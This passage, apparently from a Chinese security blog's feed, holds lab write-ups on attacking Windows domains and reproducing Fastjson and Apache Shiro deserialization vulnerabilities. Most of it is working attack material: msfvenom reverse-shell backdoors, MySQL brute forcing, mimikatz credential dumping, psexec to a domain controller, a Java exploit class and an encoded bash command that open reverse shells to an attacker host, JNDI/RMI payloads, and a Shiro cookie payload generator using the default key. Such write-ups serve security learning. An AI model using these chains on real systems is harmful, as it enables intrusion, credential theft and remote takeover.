alt="image-20220319122142921"></p><p>渗透前提:拿到了域客户机2008的shell</p><p>生成metaploit后门，并监听</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.115set lport 12345exploit</code></pre><p>运行后门，得到2008服务器反弹shell</p><p>扫描内网的机器</p><pre><code>run post/windows/gather/qrp_scanner rhosts=10.10.1.0/24</code></pre><p>加入路由</p><pre><code>backgroundroute add 10.10.1.3 255.255.255.0 1</code></pre><p>使用扫描器</p><pre><code>use scanner/portscan/tcp  #默认扫描1-10000端口set rhost 10.10.1.3exploit</code></pre><p>通过扫描发现 10.10.1.3 的3306端口存在mysql服务</p><p>进行弱口令攻击</p><pre><code>use auxiliary/scanner/mysql/mysql_loginset rhost 10.10.1.3set username rootset pass_file /root/password.txtexploit</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319124232296.png" alt="image-20220319124232296"></p><p>成功爆破出弱口令</p><p>尝试使用mysql_mof提权,得到域客户机2003的session</p><pre><code>use exploit/windows/mysql/mysql_mofset password 123456set rhost 10.10.1.3set username rootset payload windows/metepreter/bind_tcpexploit</code></pre><p>现在拿到了2003的系统权限，就可以使用一些命令进行信息搜集</p><pre><code>new view /domain:moonsec #查看当前域用户</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319125543944.png" alt="image-20220319125543944"></p><p>得到目标机ip</p><pre><code>ping SERVERS2003</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319125634094.png" alt="image-20220319125634094"></p><pre><code>net user /domain  #获取所有域的用户列表net group /domain #获取域用户组信息net group &quot;domain admins&quot; /domain #获取当前域管理员信息net time /domain #查看域实际及域服务器名字</code></pre><p>可以得到域控信息</p><pre><code>WIN-7230786H6KU.moonsec.com 10.10.1.2 #这个就是域控</code></pre><p>因为普通域用户 需要更改系统信息 都需要通过域管理员的操作 要输入账号密码</p><p>抓明文 mimikatz</p><pre><code>meterpreter &gt; load mimikatzmeterpreter &gt; msv  #获取hash密码</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319130901701.png" alt="image-20220319130901701"></p><p>尝试能否抓明文</p><pre><code>meterpreter &gt; kerberos #获取明文密码</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319132330184.png" alt="image-20220319132330184"></p><p>现在想要获取session</p><pre><code>use exploit/windows/smb/psexecset rhost 10.10.1.2set SMBDomain moonsecset SMBUser administratorset SMBPass xxx123456..set payload windows/meterpreter/bind_tcpexploit</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133243629.png" alt="image-20220319133243629"></p><p>得到域控shell，但是权限不够</p><pre><code>get privsgetsystem</code></pre><p>使用uac提权</p><pre><code>use exploit/windows/local/askset sessions 3exploit</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133844674.png" alt="image-20220319133844674"></p><p>提权成功</p><p>获取hash密码</p><pre><code>meterpreter &gt; hashdump#或者meterpreter &gt;  run post/windows/gather/hashdump</code></pre><p>mimikatz抓明文密码</p><pre><code>meterpreter &gt; load mimikatzmeterpreter &gt; msv  #获取hash密码meterpreter &gt; kerberos #获取明文密码meterpreter &gt; mimikatz_command -f samd::hashes #另一种方式获取hash值</code></pre><p>权限维持：进程注入</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133930152.png" alt="image-20220319133930152"></p><pre><code>meterpreter &gt; migrate 2804</code></pre><p>开启域控远程连接</p><pre><code>meterpreter &gt; run getgui -e</code></pre><p>使用socks4a连接3389</p><pre><code>run autoroute -s 10.10.1.0/24 255.255.255.0use auxiliary/server/socks4aset srvhost 10.10.1.2</code></pre><p>配置pxoxychains.conf</p><pre><code>vim /etc/proxychains.conf</code></pre><pre><code>....socks4 192.168.0.115 1080</code></pre><p>登录3389</p><pre><code>root@kali:~ proxychains rdesktop 10.10.1.2 #登录3389端口</code></pre><p>增加账号</p><pre><code>meterpreter &gt; run getgui -u moonsec -p moonsec</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;域的搭建&quot;&gt;&lt;a href=&quot;#域的搭建&quot; class=&quot;headerlink&quot; title=&quot;域的搭建&quot;&gt;&lt;/a&gt;域的搭建&lt;/h1&gt;&lt;p&gt;实验环境:&lt;/p&gt;
&lt;p&gt;win2008 域控       本地管理员密码:0801.com  域</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="内网" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="内网" scheme="https://sakurahack-y.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson漏洞复现</title>
    <link href="https://sakurahack-y.github.io/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://sakurahack-y.github.io/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-03-16T09:39:56.000Z</published>
    <updated>2022-03-16T17:49:45.638Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a href="https://so.csdn.net/so/search?q=Fastjson&spm=1001.2101.3001.7020">Fastjson</a>是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。具有执行效率高的特点，应用范围广泛。</p><h1 id="fastjson指纹识别"><a href="#fastjson指纹识别" class="headerlink" title="fastjson指纹识别"></a>fastjson指纹识别</h1><p>当我们在渗透测试中，抓包的时候发现返回的流量内容存在json格式时，我们就可以想它是不是使用了fastjson库</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>接着我们可以进一步进行判断</p><ol><li>根据报错信息判断</li></ol><p>发送一个post请求。发送的数据为没闭合的花括号，如果服务器没有屏蔽错误信息则会报出fastjson的信息。如果屏蔽了报错信息请看第二条</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><ol start="2"><li>利用dnslog盲打</li></ol><p>对目标发送一个POST请求，请求体内容如下。请求头添加Content-Type: application/json</p><pre><code>&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125; </code></pre><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>DNSlog刷新成功</p><h1 id="Fastjson-lt-1-2-24远程代码执行-CVE-2017-18349"><a href="#Fastjson-lt-1-2-24远程代码执行-CVE-2017-18349" class="headerlink" title="Fastjson&lt;1.2.24远程代码执行(CVE-2017-18349)"></a>Fastjson&lt;1.2.24远程代码执行(CVE-2017-18349)</h1><p><strong>漏洞详情</strong></p><p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p><p><strong>漏洞版本</strong></p><p>fastjson &lt;=1.2.24</p><p><strong>漏洞分析</strong></p><p><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></p><p><strong>需要环境</strong></p><p>在本机提前安装好maven和jdk</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220316235940219.png" alt="image-20220316235940219"></p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317000000186.png" alt="image-20220317000000186"></p><p><strong>漏洞复现</strong></p><p>使用vulhub搭建漏洞环境</p><pre><code class="text">docker-compose up d</code></pre><p>访问xxx:8090</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220316235812389.png" alt="image-20220316235812389"></p><p>保存以下代码</p><p>dnslog.java</p><pre><code class="java">import java.io.BufferedReader;import java.io.InputStream;import java.io.InputStreamReader; public class Exploit&#123;    public Exploit() throws Exception &#123;        Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/VPS的IP/6666 0&gt;&amp;1&quot;&#125;);        InputStream is = p.getInputStream();        BufferedReader reader = new BufferedReader(new InputStreamReader(is));         String line;        while((line = reader.readLine()) != null) &#123;            System.out.println(line);        &#125;         p.waitFor();        is.close();        reader.close();        p.destroy();    &#125;     public static void main(String[] args) throws Exception &#123;    &#125;&#125;</code></pre><p>编译为Exploit.class</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317010125235.png" alt="image-20220317010125235"></p><p>使用python在当前目录下起一个http服务，如果端口占用换其他的</p><pre><code class="text">python -m SimpleHTTPServer 4567</code></pre><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317000648363.png" alt="image-20220317000648363"></p><p>使用marshalsec项目，启动RMI服务，监听9999端口并加载远程类Exploit.class</p><pre><code class="text">git clone https://github.com/mbechler/marshalsec.gitcd marshalsec/编译项目mvn clean package -DskipTests</code></pre><p>以我搭建Exploit.class类http服务的服务器IP为2.2.2.2端口为4567</p><pre><code class="text">cd target/java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://xxx:4567/#Exploit&quot; 9999</code></pre><p>RMI服务可以搭建在与Exploit.class类的http服务同一台服务器，也可以搭建在其它服务器上。我们演示还是在同一台。</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317001425835.png" alt="image-20220317001425835"></p><p>环境已经搭建好，接下来使用burp开始</p><pre><code class="text">POST / HTTP/1.1Accept: */*Accept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; NMTE)Host: 目标ip:8090Connection: closeContent-Length: 162Content-Type: application/jsonAccept-Encoding: gzip, deflate&#123;    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;rmi://vps的ip:9999/Exploit&quot;,        &quot;autoCommit&quot;:true    &#125;&#125;</code></pre><p>如图即代表攻击成功</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317012518646.png" alt="image-20220317012518646"></p><p>RMI服务响应</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013058412.png" alt="image-20220317013058412"></p><p>python搭建的http服务响应</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013143699.png" alt="image-20220317013143699"></p><p>nc</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013212099.png" alt="image-20220317013212099"></p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013225316.png" alt="image-20220317013225316"></p><h1 id="Fastjson-1-2-47-远程命令执行漏洞"><a href="#Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="Fastjson 1.2.47 远程命令执行漏洞"></a>Fastjson 1.2.47 远程命令执行漏洞</h1><p>和fastjson1.2.24差不多，就是poc不一样而已</p><p><strong>影响版本</strong></p><ul><li>fastjson&lt;=1.2.47</li></ul><p><strong>漏洞检测</strong></p><p>检测方式和1.2.24一样</p><p>漏洞利用</p><p>创建恶意类，python搭建服务</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317010125235.png" alt="image-20220317010125235"></p><p>搭建RMI服务</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317001425835.png" alt="image-20220317001425835"></p><p>发送的数据包改为即可</p><pre><code class="text">POST / HTTP/1.1Host: 192.168.140.158:8090   #靶机地址Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 263 &#123;    &quot;a&quot;:&#123;        &quot;@type&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;rmi://VPS地址:端口/Exploit&quot;,  #这里的Exploit不能变        &quot;autoCommit&quot;:true    &#125;&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://so.csdn.net/so/search?q=Fastjson&amp;spm=1001.2101.3001.7</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="fastjson" scheme="https://sakurahack-y.github.io/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>shiro漏洞复现</title>
    <link href="https://sakurahack-y.github.io/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://sakurahack-y.github.io/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-03-15T09:11:24.000Z</published>
    <updated>2022-03-15T12:30:46.449Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><h1 id="Shiro-rememberMe反序列化漏洞（Shiro-550）"><a href="#Shiro-rememberMe反序列化漏洞（Shiro-550）" class="headerlink" title="Shiro rememberMe反序列化漏洞（Shiro-550）"></a>Shiro rememberMe反序列化漏洞（Shiro-550）</h1><p><strong>影响版本:Apache Shiro &lt; 1.2.4</strong></p><p><strong>漏洞原理：</strong>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。那么，Payload产生的过程：<br>命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值<br>在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单。</p><p><strong>特征判断</strong></p><p>返回包中包含rememberMe=deleteMe字段。</p><p><strong>环境搭建</strong></p><pre><code class="text">获取docker镜像docker pull medicean/vulapps:s_shiro_1启动docker镜像：docker run -d -p 8080:8080 medicean/vulapps:s_shiro_1</code></pre><p><strong>工具准备</strong></p><p>maven配置:</p><pre><code class="text">sudo wget  https://mirrors.tuna.tsinghua.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gztar -zxvf apache-maven-3.6.3-bin.tar.gzsudo mv apache-maven-3.6.3 /usr/local/maven3在/etc/profile末尾添加maven环境变量:export M2_HOME=/usr/local/maven3export PATH=$PATH:$JAVA_HOME/bin:$M2_HOME/binsource /etc/profile</code></pre><p>下载ysoserial并打包:</p><pre><code class="text">git clone https://github.com/frohoff/ysoserial.gitcd ysoserialmvn package -D skipTests</code></pre><p>生成的工具在ysoserial/target文件中。</p><p><strong>复现流程</strong></p><p><strong>1、检查是否存在默认的key</strong></p><p>推荐使用Shiro_exploit检测:<a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181209641.png" alt="image-20220315181209641"></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181335231.png" alt="image-20220315181335231"></p><p>如图成功获取密钥</p><p><strong>2、nc监听本地端口</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181502656.png" alt="image-20220315181502656"></p><p><strong>3、编写反弹shell代码</strong></p><pre><code class="text">bash -i &gt;&amp; /dev/tcp/192.168.172.133/1234 0&gt;&amp;1#进行base64编码bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></pre><p><strong>4、通过ysoserial中JRMP监听模块，监听5555端口并执行反弹shell命令。</strong></p><pre><code class="text">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 5555 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315185158472.png" alt="image-20220315185158472"></p><p><strong>5、使用shiro.py生成payload</strong></p><pre><code class="text">import sysimport uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command):    popen = subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;, &#39;JRMPClient&#39;, command], stdout=subprocess.PIPE)    BS = AES.block_size    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)    iv = uuid.uuid4().bytes    encryptor = AES.new(key, AES.MODE_CBC, iv)    file_body = pad(popen.stdout.read())    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))    return base64_ciphertextif __name__ == &#39;__main__&#39;:    payload = encode_rememberme(sys.argv[1])   print &quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315192829289.png" alt="image-20220315192829289"></p><p>ps:注意shiro.py要在target目录下</p><p><strong>6、构造数据包，伪造cookie，发送Payload</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200340397.png" alt="image-20220315200340397"></p><p>用上文产生的payload进行替换</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200402486.png" alt="image-20220315200402486"></p><p>发送</p><p><strong>7、成功反弹shell</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200453881.png" alt="image-20220315200453881"></p><h1 id="Shiro-Padding-Oracle-Attack（Shiro-721）"><a href="#Shiro-Padding-Oracle-Attack（Shiro-721）" class="headerlink" title="Shiro Padding Oracle Attack（Shiro-721）"></a>Shiro Padding Oracle Attack（Shiro-721）</h1><p><strong>漏洞原理</strong></p><p>由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding  Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。<br>影响版本：Apache Shiro &lt; 1.4.2版本。</p><p><strong>漏洞利用：</strong><br>1、登录Shiro网站，从cookie中获得rememberMe字段的值。</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113116568-425378550.png" alt="img"><br>2、利用DNSlog探测，通过ysoserial工具payload。</p><pre><code class="text">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;ping 75bbot.dnslog.cn&quot; &gt; payload.class</code></pre><p>3、使用rememberMe值作为prefix，加载Payload，进行Padding Oracle攻击。<br>github项目地址：<a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721">https://github.com/longofo/PaddingOracleAttack-Shiro-721</a><br>使用示例：</p><pre><code class="text">java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113145995-1951867126.png" alt="img"><br>爆破成功，输出Result：</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113200234-980599342.png" alt="img"></p><p>4、使用构造的rememberMe攻击字符串重新请求网站<img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113217346-911399190.png" alt="img"></p><p>5、成功触发Payload，在DNSLog获取到目标IP。<img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113226312-979603878.png" alt="img"></p><h1 id="一键自动化漏洞利用工具"><a href="#一键自动化漏洞利用工具" class="headerlink" title="一键自动化漏洞利用工具"></a>一键自动化漏洞利用工具</h1><p>ShiroExploit：支持对Shiro-550（硬编码秘钥）和Shiro-721（Padding Oracle）的一键化检测，支持简单回显。<br>Github项目地址：<a href="https://github.com/feihong-cs/ShiroExploit">https://github.com/feihong-cs/ShiroExploit</a></p><p>Shiro-550，只需输入url，即可完成自动化检测和漏洞利用。</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113422921-1885042148.png" alt="img"></p><p>Shiro-721，需输入url，提供一个有效的rememberMe Cookie，并指定目标操作系统类型。</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113437704-589381400.png" alt="img"></p><p>参考链接:<a href="https://www.cnblogs.com/xiaozi/p/13239046.html">https://www.cnblogs.com/xiaozi/p/13239046.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="shrio" scheme="https://sakurahack-y.github.io/tags/shrio/"/>
    
  </entry>
  
</feed>
